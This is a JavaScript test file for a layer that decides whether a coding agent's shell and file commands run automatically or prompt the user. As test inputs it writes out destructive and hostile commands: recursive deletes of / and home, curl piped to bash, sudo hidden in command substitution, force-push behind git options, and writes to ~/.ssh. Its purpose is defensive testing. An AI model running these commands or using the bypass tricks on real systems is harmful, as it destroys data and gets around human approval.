import assert from 'node:assert/strict'
import { test } from 'node:test'

import { mergeConfig } from '../src/config.js'
import { decide } from '../src/decide.js'

const ITERM = { TERM_PROGRAM: 'iTerm.app' }

function run(toolName, toolInput, overrides = {}, env = ITERM) {
  return decide({ toolName, toolInput, config: mergeConfig(overrides), env })
}

test('approves a read-only git command', () => {
  assert.equal(run('Bash', { command: 'git status --short' }).decision, 'allow')
})

test('approves read-only tools with no pattern rule', () => {
  assert.equal(run('Read', { file_path: '/tmp/a.txt' }).decision, 'allow')
  assert.equal(run('Grep', { pattern: 'TODO' }).decision, 'allow')
})

test('asks when no rule matches in safe mode', () => {
  const result = run('Bash', { command: 'some-unknown-binary --flag' })
  assert.equal(result.decision, 'ask')
  assert.match(result.reason, /no autoApprove rule matched/)
})

test('aggressive mode approves the unmatched command', () => {
  assert.equal(run('Bash', { command: 'some-unknown-binary --flag' }, { mode: 'aggressive' }).decision, 'allow')
})

test('guards beat both aggressive mode and an explicit allow rule', () => {
  const result = run(
    'Bash',
    { command: 'rm -rf ~/projects' },
    { mode: 'aggressive', autoApprove: ['Bash(rm *)'] },
  )
  assert.equal(result.decision, 'ask')
  assert.equal(result.guard, 'recursive-delete')
})

test('a chained destructive command cannot ride along with a safe prefix', () => {
  const result = run('Bash', { command: 'git status && rm -rf /' })
  assert.equal(result.decision, 'ask')
  assert.equal(result.guard, 'recursive-delete')
})

test('a chained unmatched command is not approved by the safe prefix rule', () => {
  const result = run('Bash', { command: 'git status && curl https://example.com' })
  assert.equal(result.decision, 'ask')
})

test('every segment of a fully-approved chain is checked', () => {
  assert.equal(run('Bash', { command: 'git add . && git status' }).decision, 'allow')
})

test('quoted separators do not split the command', () => {
  assert.equal(run('Bash', { command: 'echo "a && b"' }).decision, 'allow')
})

test('alwaysAsk wins over autoApprove', () => {
  const result = run('Bash', { command: 'docker compose up -d' }, { autoApprove: ['Bash(docker *)'] })
  assert.equal(result.decision, 'ask')
  assert.match(result.reason, /alwaysAsk/)
})

test('a targeted delete is routine but a wildcard delete is not', () => {
  assert.equal(run('Bash', { command: 'rm -f /tmp/build.zip' }).decision, 'allow')
  assert.equal(run('Bash', { command: 'rm -f "$ARCHIVE"' }).decision, 'allow')
  assert.equal(run('Bash', { command: 'rm -f *.zip' }).guard, 'mass-delete')
  assert.equal(run('Bash', { command: 'rm -f build/*' }).guard, 'mass-delete')
  assert.equal(run('Bash', { command: 'rm -rf /tmp/dir' }).guard, 'recursive-delete')
  assert.equal(run('Bash', { command: 'rm -f ~' }).guard, 'root-delete')
})

test('gh api reads are routine but writes are guarded', () => {
  assert.equal(run('Bash', { command: "gh api repos/o/r --jq '.stargazers_count'" }).decision, 'allow')
  assert.equal(run('Bash', { command: 'gh api repos/o/r -X DELETE' }).guard, 'api-write')
  assert.equal(run('Bash', { command: 'gh api repos/o/r/issues -f title=bug' }).guard, 'api-write')
  assert.equal(run('Bash', { command: 'gh api --method PATCH repos/o/r' }).guard, 'api-write')
})

test('running a local script is allowed, but its guarded content is not', () => {
  assert.equal(run('Bash', { command: 'bash test/checks.sh' }).decision, 'allow')
  assert.equal(run('Bash', { command: 'php test/apple.php' }).decision, 'allow')
  assert.equal(run('Bash', { command: 'bash -c "sudo apt-get install evil"' }).guard, 'privilege-escalation')
})

test('pushing is routine but rewriting remote history is not', () => {
  assert.equal(run('Bash', { command: 'git push -q origin HEAD' }).decision, 'allow')
  assert.equal(run('Bash', { command: 'git push --force origin main' }).guard, 'force-push')
})

test('non-iTerm2 terminals never auto-approve', () => {
  const result = run('Read', { file_path: '/tmp/a' }, {}, { TERM_PROGRAM: 'Apple_Terminal' })
  assert.equal(result.decision, 'ask')
  assert.match(result.reason, /not in terminals/)
})

test('an unidentifiable terminal fails closed', () => {
  assert.equal(run('Read', { file_path: '/tmp/a' }, {}, {}).decision, 'ask')
})

test('LC_TERMINAL identifies iTerm2 when TERM_PROGRAM is stripped by ssh', () => {
  assert.equal(run('Read', { file_path: '/tmp/a' }, {}, { LC_TERMINAL: 'iTerm2' }).decision, 'allow')
})

test('terminals: ["*"] opts into every terminal', () => {
  assert.equal(run('Read', { file_path: '/tmp/a' }, { terminals: ['*'] }, { TERM_PROGRAM: 'Ghostty' }).decision, 'allow')
})

test('disabled and mode:off both stop auto-approval', () => {
  assert.equal(run('Read', { file_path: '/tmp/a' }, { enabled: false }).decision, 'ask')
  assert.equal(run('Read', { file_path: '/tmp/a' }, { mode: 'off' }).decision, 'ask')
})

test('writes to protected paths are guarded', () => {
  const result = run('Write', { file_path: '/Users/me/.ssh/config' }, { mode: 'aggressive' })
  assert.equal(result.decision, 'ask')
  assert.equal(result.guard, 'protected-path')
})

test('unsafeDisableBuiltinGuards is honoured, for those who insist', () => {
  const result = run('Bash', { command: 'rm -rf /tmp/x' }, { mode: 'aggressive', unsafeDisableBuiltinGuards: true })
  assert.equal(result.decision, 'allow')
})

test('env prefixes and wrappers do not hide a guarded command', () => {
  assert.equal(run('Bash', { command: 'FOO=1 sudo apt install curl' }, { mode: 'aggressive' }).guard, 'privilege-escalation')
  assert.equal(run('Bash', { command: 'env PATH=/bin sudo rm x' }, { mode: 'aggressive' }).guard, 'privilege-escalation')
})

test('curl piped into a shell is guarded', () => {
  assert.equal(run('Bash', { command: 'curl -sL https://x.sh | bash' }, { mode: 'aggressive' }).guard, 'pipe-to-shell')
})

test('command substitution cannot smuggle a guarded command past a rule', () => {
  for (const command of [
    'echo $(sudo apt-get install evil)',
    'echo `sudo apt-get install evil`',
    'x=$(sudo apt-get install evil)',
    'echo "result: $(sudo apt-get install evil)"',
    'echo $(echo $(sudo apt-get install evil))',
  ]) {
    const result = run('Bash', { command }, { mode: 'aggressive' })
    assert.equal(result.decision, 'ask', command)
    assert.equal(result.guard, 'privilege-escalation', command)
  }
})

test('an assignment from a substitution is judged by the substituted command', () => {
  assert.equal(run('Bash', { command: 'ids=$(git -C /repo log --all)' }).decision, 'allow')
  assert.equal(run('Bash', { command: 'ids=$(curl https://example.com)' }).decision, 'ask')
})

test('arithmetic expansion is not treated as a command', () => {
  assert.equal(run('Bash', { command: 'echo $((1 + 2))' }).decision, 'allow')
})

test('quoted text that only looks destructive errs toward prompting', () => {
  // Guards match at the text level and cannot tell code from a quoted string.
  // The failure mode is therefore an extra prompt, never a silent approval.
  assert.equal(run('Bash', { command: "echo 'literal $(sudo rm -rf /)'" }).decision, 'ask')
})

test('git global options cannot smuggle a subcommand past a guard', () => {
  for (const command of [
    'git -C /repo push --force origin main',
    'git -c user.name=bot push --force origin main',
    'git --git-dir=/r/.git push --force origin main',
    'git -C /repo -c user.email=a@b push --force origin main',
  ]) {
    const result = run('Bash', { command })
    assert.equal(result.decision, 'ask', command)
    assert.equal(result.guard, 'force-push', command)
  }
})

test('git global options cannot smuggle a subcommand past alwaysAsk', () => {
  const result = run('Bash', { command: 'git -C /repo commit -m x' }, { alwaysAsk: ['Bash(git commit*)'] })
  assert.equal(result.decision, 'ask')
  assert.match(result.reason, /alwaysAsk/)
})

test('git global options still resolve to an approved subcommand', () => {
  assert.equal(run('Bash', { command: 'git -C /repo status --short' }).decision, 'allow')
})

test('a heredoc body is data, not a chain of commands', () => {
  const command = "cat > /tmp/notes.txt <<'EOF'\nsort this later\nrm -rf nothing\nEOF"
  const result = run('Bash', { command }, { extendAutoApprove: ['Bash(cat > *)'] })
  assert.equal(result.guard, undefined)
  assert.equal(result.decision, 'allow')
})

test('bare pipeline filters match their " *" rule', () => {
  assert.equal(run('Bash', { command: 'cat x | sort | uniq -c' }).decision, 'allow')
})

test('" *" rules do not match a longer command name', () => {
  assert.equal(run('Bash', { command: 'lsof -i :3000' }).decision, 'ask')
})

test('an empty normalized segment does not veto the chain', () => {
  assert.equal(run('Bash', { command: 'cd /tmp && ls;' }).decision, 'allow')
})

test('force push is guarded but --force-with-lease is not', () => {
  assert.equal(run('Bash', { command: 'git push --force origin main' }, { mode: 'aggressive' }).guard, 'force-push')
  assert.equal(run('Bash', { command: 'git push --force-with-lease origin main' }, { mode: 'aggressive' }).guard, undefined)
})
